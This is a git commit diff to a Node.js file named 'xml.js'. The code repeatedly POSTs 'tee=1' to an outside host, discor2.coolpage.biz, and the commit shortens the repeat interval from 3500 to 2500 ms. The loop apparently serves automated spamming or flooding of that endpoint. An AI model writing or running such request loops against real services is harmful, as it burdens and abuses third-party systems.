0353618706d52ea591a4404ecdfaeac3133fed07
DRL7N <40870933+DRL7N@users.noreply.github.com>
2018-11-24 17:59:20 +0300

    Update xml.js

--- xml.js
+++ xml.js
@@ -2,4 +2,4 @@ const fetch = require('node-fetch');
 
 function join(argument) {
 fetch('http://discor2.coolpage.biz/index.php', { method: 'POST', body: 'tee=1' })}
-setInterval(join,3500);
+setInterval(join,2500);
